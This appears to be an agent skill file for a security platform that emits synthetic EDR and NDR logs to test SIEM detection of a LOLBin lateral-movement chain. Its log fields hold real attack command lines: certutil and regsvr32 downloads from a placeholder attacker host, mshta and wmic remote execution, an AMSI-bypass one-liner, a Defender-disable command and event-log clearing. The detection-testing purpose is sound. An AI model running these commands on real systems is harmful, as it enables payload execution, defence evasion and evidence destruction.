---
name: lolbin_lateral_movement
displayName: LOLBin lateral movement
category: scenarios
description: 'Three-stage in-environment attack chain. Stage 1: EDR sees signed-binary execution (LOLBins) with attacker-typical arguments. Stage 2: NDR detects east-west SMB/RPC anomalies as the attacker pivots between hosts. Stage 3: EDR sees security-tool tamper as the attacker prepares the next host. Vendor-agnostic — agent resolves vendor/product from the operator''s installed data sources at runtime. Triggers 3 XSIAM rules: Suspicious PowerShell / LOLBin Args, Anomalous Lateral Movement (SMB/RPC), EDR / Defender Tamper. Use when you need to demonstrate detection of fileless / signed-binary tradecraft without deploying actual malicious binaries.'
icon: handyman
source: platform
loadingMode: on-demand
locked: false
attack:
  - 'TA0002: Execution (T1059.001 PowerShell, T1218.011 Rundll32, T1218.005 Mshta, T1140 Deobfuscate)'
  - 'TA0005: Defense Evasion (T1218 Signed Binary Proxy Execution, T1562.001 Disable Security Tools, T1562.004 Disable AMSI)'
  - 'TA0008: Lateral Movement (T1021.002 SMB/Windows Admin Shares, T1047 Windows Management Instrumentation)'
---

# Skill: Living-off-the-land lateral movement

## Category

scenarios

## Attack Type

Post-foothold, in-environment movement using only Windows-signed binaries (LOLBins). No malware drop is needed — the attacker uses tools that ship with Windows: `wmic.exe`, `certutil.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`. EDR detection has to key on argument patterns and parent-child trees, not file hashes.

This skill assumes the attacker already has a foothold (e.g., from `malicious_email_to_endpoint_persistence` or `bruteforce_vpn_to_lateral`). Use it as a Stage-2 follow-on or in standalone exercises that want to validate "we'd catch tradecraft, even when the attacker brings no binaries."

## MITRE ATT&CK Tactics

- TA0002: Execution (T1059.001 PowerShell, T1218.011 Rundll32, T1218.005 Mshta, T1140 Deobfuscate)
- TA0005: Defense Evasion (T1218 Signed Binary Proxy Execution, T1562.001 Disable Security Tools, T1562.004 Disable AMSI)
- TA0008: Lateral Movement (T1021.002 SMB/Windows Admin Shares, T1047 Windows Management Instrumentation)

## XSIAM analytics rules triggered

| # | Rule | Stage |
|---|---|---|
| 13 | Suspicious PowerShell / LOLBin Args | Stage 1 |
| 12 | Anomalous Lateral Movement (SMB/RPC) | Stage 2 |
| 19 | EDR / Defender Tamper | Stage 3 |

## Data classes used

| Stage | Data class | If missing |
|---|---|---|
| 1, 3 | `edr` | Required — entire skill is endpoint-tradecraft visibility |
| 2 | `ndr` | Substitute with `firewall` internal-zone east-west logs (see `bruteforce_vpn_to_lateral` Stage 4 substitution recipe) |

## Pre-flight

**Resolve the destination as a store reference.** Call `log_destinations_list` once and take the
`id` of the operator's default (or only) destination, then pass `destination: "logdest:<id>"`.
The platform resolves the reference server-side and injects any credentials, so secrets never
cross the agent surface. **Never pass a destination's `type` (`syslog`) — that is not an accepted
value** — and never hardcode a broker host/port. Accepted forms are `logdest:<id>` (preferred),
a raw `udp:host:port` for a one-shot the operator names explicitly, or `XSIAM_WEBHOOK` (legacy).
Destination selection is independent of the data-source vendor/product lookup below.

**Make the events vendor-faithful.** For each class you will emit, call
`data_sources_get_schema(<entry>.data_source_id, compact=true)` and pass the returned `fields[]`
verbatim as `schema_override` on that stage's worker. Without it the worker emits generic
observables that the vendor's modeling rule cannot map, so events land raw and `xdm.*` stays
empty. `compact=true` is lossless for this purpose and keeps the payload inside the tool-result cap.

### Class check (MANDATORY — before creating any worker)

1. Call `data_sources_installed_as_vendors` once. Group `vendors[]` by `data_source_class`.
2. For every row of the "Data classes used" table, write down the installed entry you will use for it, or `MISSING`. A class is only covered by an installed entry. A generic or catch-all schema is never a substitute, and never guess a vendor/product for a class.
3. `edr` (Stages 1 and 3) is required. If it is `MISSING`, say this to the operator, with the class filled in: "No installed data source covers the `<class>` class, so I cannot run the LOLBin lateral movement scenario. Install a `<class>` data source from the Marketplace and ask again." Then stop: create no worker.
   If `ndr` (Stage 2) is `MISSING`, use the installed `firewall` entry's internal-zone east-west logs (the pattern in `bruteforce_vpn_to_lateral` Stage 4); say you are substituting. If there is no `firewall` entry either, skip Stage 2 with the sentence below.
   "No installed data source covers the `<class>` class, so I am skipping Stage <N> (<stage name>). I will not generate it with a generic schema. Install a `<class>` data source from the Marketplace to include it."
4. In your final report, list every stage you skipped or substituted and which of the alerts above will therefore not fire.

## Narrative thread

- **Compromised host:** `wks-foster-01` at `10.10.20.91`, user `g.foster`
- **Lateral targets:** `dc01` at `10.10.10.10`, `sql01` at `10.10.40.20`, `fs01` at `10.10.50.20`
- **Attacker remote staging URL (Stage 1):** `https://cdn-static-assets.gq/sw.ps1`
- **Attacker C2 IP (Stage 2 lateral):** internal pivot through `dc01`, no external C2 in this skill's window
- **Stolen credential being abused:** `svc_backup` (service account with admin rights on multiple servers — typical IT-tooling sprawl)
- **Wall-clock time:** Stage 1 ~8 min (LOLBin execution chain). Stage 2 ~12 min (lateral). Stage 3 ~3 min (tamper before next pivot).

---

### Stage 1 — Signed-binary execution chain — ~12 events over 8 minutes

The attacker on `wks-foster-01` runs a sequence of LOLBins:
1. `certutil.exe -urlcache -f https://...` to download the next-stage script
2. `mshta.exe vbscript:CreateObject(...)` to execute the inline payload from the response
3. `wmic.exe process call create` to trigger remote execution on the discovered targets
4. `rundll32.exe` to side-load a malicious DLL into a normal process

**Data class:** `edr`

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[edr].vendor>
  product: <stack[edr].product>
  count:    12
  interval: 38
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    shost:        ["wks-foster-01"]
    src:          ["10.10.20.91"]
    suser:            ["g.foster"]
    sproc:    ["certutil.exe", "mshta.exe", "wmic.exe",
                      "rundll32.exe", "regsvr32.exe", "powershell.exe"]
    parentProcessName:  ["powershell.exe", "cmd.exe", "wmiprvse.exe"]
    commandLine:    ["certutil.exe -urlcache -f https://cdn-static-assets.gq/sw.ps1 C:\\Users\\Public\\sw.ps1",
                      "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -nop -w hidden -ep bypass -c <encoded>\"\"\")(window.close)",
                      "wmic.exe /node:dc01 process call create \"powershell.exe -nop -w hidden -ep bypass -enc <encoded>\"",
                      "wmic.exe /node:sql01 process call create \"cmd.exe /c whoami /all > \\\\10.10.20.91\\C$\\Users\\Public\\out.txt\"",
                      "rundll32.exe C:\\Users\\Public\\sw.dll,EntryPoint",
                      "regsvr32.exe /s /n /u /i:https://cdn-static-assets.gq/scrobj.sct scrobj.dll"]
    filePath:       ["C:\\Windows\\System32\\certutil.exe",
                      "C:\\Windows\\System32\\mshta.exe",
                      "C:\\Windows\\System32\\wbem\\wmic.exe",
                      "C:\\Windows\\System32\\rundll32.exe",
                      "C:\\Windows\\System32\\regsvr32.exe"]
    signature:  ["valid", "valid", "valid", "valid", "valid"]
    signer:     ["Microsoft Windows", "Microsoft Windows", "Microsoft Windows"]
    fname:          ["C:\\Users\\Public\\sw.ps1", "C:\\Users\\Public\\sw.dll", ""]
    dhost:     ["", "", "dc01", "sql01", ""]
    act:          ["process_create", "remote_process_create", "file_download"]
    cefSeverity:        ["high", "critical"]
    alertName:      ["LOLBin certutil used as URL downloader",
                      "mshta.exe with inline VBScript payload",
                      "Remote process creation via WMIC",
                      "rundll32 sideload from Public directory"]
    attackType:     ["lolbin_execution", "remote_execution_wmic"]
    attackSeverity: ["high"]
    mitreTechnique: ["T1218.011", "T1218.005", "T1047", "T1218"]
```

**Field semantics:**
- `process_name` are all **legitimate Microsoft-signed binaries**. EDR detection cannot key on file hash — every hash here is on Microsoft's allowlist
- `command_line` arguments are the smoking gun:
  - `certutil -urlcache -f <url>` — `certutil` is for certificate management; using it as a URL downloader (`-urlcache -f`) is a known LOLBin pattern. Legitimate use is rare
  - `mshta vbscript:` — `mshta` runs HTML applications; the `vbscript:` URI scheme inline-executes script. Legitimate use is essentially zero
  - `wmic /node:<host> process call create` — WMI remote process creation; legitimate IT tooling does use this, but only from administrator workstations + only against managed servers (not from a regular user workstation to a DC)
  - `rundll32 <user-writable-dll>,EntryPoint` — `rundll32` legitimately loads DLLs; loading a DLL from `C:\Users\Public\` is the suspicious bit
  - `regsvr32 /s /n /u /i:https://...` — the "Squiblydoo" technique; `regsvr32` fetches a remote `.sct` file and executes its embedded scripting
- `file_signer: Microsoft Windows` — explicit confirmation these are signed binaries; the fact that they're being abused is the entire premise of the LOLBin tradecraft

**Why this fires Rule #13:** modern EDR products bundle dozens of LOLBin-pattern detections out of the box. Each command-line above triggers ≥1 named alert. With 6 distinct LOLBin patterns within 8 min from one host, the SIEM correlates them into a "LOLBin attack chain on host X" finding.

---

### Stage 2 — Lateral movement: NDR sees east-west SMB/RPC anomaly — ~80 events over 12 minutes

The WMI remote-process calls in Stage 1 generated outbound RPC and SMB to `dc01`, `sql01`, `fs01`. NDR — which has been baselining `wks-foster-01`'s normal traffic for weeks — sees the workstation suddenly making admin-share connections to multiple servers, and flags the deviation.

**Data class:** `ndr`

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[ndr].vendor>
  product: <stack[ndr].product>
  count:    80
  interval: 9
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    src:        ["10.10.20.91"]
    shost:      ["wks-foster-01"]
    dst:        ["10.10.10.10", "10.10.40.20", "10.10.50.20"]
    dhost:      ["dc01", "sql01", "fs01"]
    dpt:      ["445", "139", "135", "5985", "5986", "1433"]
    proto:      ["6"]
    act:        ["alert", "monitor"]
    anomalyType:  ["lateral_movement", "first_time_admin_share_access",
                    "wmi_rpc_anomaly", "winrm_to_uncommon_destination",
                    "smb_admin_share_pattern"]
    anomalyScore: ["72", "85", "91", "68", "77", "94"]
    alertName:    ["First-time admin$ share access from workstation",
                    "WMI RPC anomaly — workstation initiating",
                    "WinRM to uncommon destination set",
                    "Lateral RPC pattern matching admin tooling"]
    alertType:    ["ndr_lateral_movement", "ndr_anomaly"]
    cefSeverity:      ["high", "critical"]
    attackCategory: ["lateral_movement"]
    attackType:     ["smb_admin_access", "wmi_remote_exec", "winrm_lateral"]
    out:     ["240", "1024", "4096", "8192", "16384"]
    in: ["180", "512", "2048", "8192"]
    suser:   ["g.foster", "svc_backup"]
    mitreTechnique: ["T1021.002", "T1047", "T1021.006"]
```

**Field semantics:**
- `dst_port` covers the lateral-movement port quartet: `445` (SMB), `139` (NetBIOS, often correlated), `135` (RPC endpoint mapper, used by WMI), `5985/5986` (WinRM), `1433` (MSSQL — for SQL-server lateral)
- `account_name: ['g.foster', 'svc_backup']` — two accounts visible in the traffic. `g.foster` is the foothold user; `svc_backup` is the service account being abused for lateral (NDR sees the auth via the SMB session setup)
- `anomaly_score: 72-94` — the higher scores fire on the "first time this workstation has done X" baseline-deviation
- `alert_name` provides realistic NDR alert text the SIEM displays

**Why this fires Rule #12:** every NDR product has a "first time host A talks to host B on port C" baseline detection. A workstation suddenly making SMB+RPC+WinRM connections to 3 different servers within minutes deviates dramatically from baseline. Combined with the username pivot (`g.foster` → `svc_backup`), this fires high-confidence lateral-movement findings.

---

### Stage 3 — Defense evasion before next pivot — ~5 events over 90 seconds

The attacker, having pivoted to `dc01` and `sql01`, prepares the next move by tampering with security tools on those hosts. Three patterns:
- AMSI bypass (PowerShell command that disables AMSI for the current process)
- WinDefend service stop on `sql01`
- Event log clearing (covers tracks)

**Data class:** `edr`

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[edr].vendor>
  product: <stack[edr].product>
  count:    5
  interval: 18
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    shost:        ["sql01", "dc01", "wks-foster-01"]
    src:          ["10.10.40.20", "10.10.10.10", "10.10.20.91"]
    suser:            ["svc_backup", "g.foster", "SYSTEM"]
    sproc:    ["powershell.exe", "sc.exe", "wevtutil.exe"]
    parentProcessName:  ["wmiprvse.exe", "powershell.exe"]
    commandLine:    ["powershell.exe [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
                      "sc.exe stop WinDefend",
                      "sc.exe config WinDefend start= disabled",
                      "wevtutil.exe cl Security",
                      "wevtutil.exe cl System"]
    serviceState:   ["stopped", "disabled"]
    act:          ["service_stop", "service_disable", "event_log_cleared",
                      "amsi_bypass", "configuration_change"]
    cefSeverity:        ["critical"]
    alertName:      ["AMSI Bypass via Reflection",
                      "Security Service Stopped — WinDefend",
                      "Security Event Log Cleared"]
    attackType:     ["amsi_bypass", "security_tool_tamper", "log_evasion"]
    attackSeverity: ["critical"]
    mitreTechnique: ["T1562.001", "T1562.004", "T1070.001"]
```

**Field semantics:**
- The AMSI bypass uses the well-known reflection technique to set the `amsiInitFailed` field. `Ref.Assembly.GetType('System.Management.Automation.AmsiUtils')` is the canonical pattern — recent EDR products detect the string match in command-line, even though the reflection itself succeeds
- `wevtutil cl Security` clears the Security event log (anti-forensics). Modern systems also log the clear-event itself in EventID 1102, which the EDR forwards
- `service_state: stopped` for `WinDefend` — the canonical Defender-disable signal
- The events span THREE hosts (`wks-foster-01` for the AMSI bypass, `sql01` for WinDefend stop, `dc01` for log clear) — showing the attacker's movement is also reflected in tamper events on each host they pivot to

**Why this fires Rule #19:** AMSI bypass is a high-fidelity EDR alert in any modern product. WinDefend service stop is universally detected. Event log clearing fires both EDR and OS-level alerts. Three independent tamper events on three different hosts within 90s is unmistakable; SIEMs roll this up into a "post-exploitation defense evasion campaign" incident.

---

## Verification

| Indicator | Where to check |
|---|---|
| LOLBin alert: certutil URL downloader from `wks-foster-01` | XSIAM Issues |
| LOLBin alert: WMIC remote process creation | XSIAM Issues |
| Lateral-movement alert: `wks-foster-01` → `dc01`/`sql01`/`fs01` | XSIAM Issues |
| AMSI bypass alert | XSIAM Issues |
| WinDefend service-stop alert | XSIAM Issues |
| Event-log-cleared alert | XSIAM Issues |
| Pivotable: filter by user=`g.foster` OR host=`wks-foster-01`, see all 3 stages | XQL: `config timeframe = 24h \| dataset = <dataset_name of the edr entry> \| filter <its user field> = "g.foster" \| limit 20` |

## Tear-down

```yaml
xlog.list_workers:
xlog.kill_worker:
  worker_id: <each>
```

## Adapting per deployment

The lateral targets `dc01` / `sql01` / `fs01` are illustrative. For a real exercise, replace with hostnames from the customer's actual asset inventory (3 servers their attackers would plausibly pivot to) so the lateral-movement alerts also enrich with the customer's CMDB context.
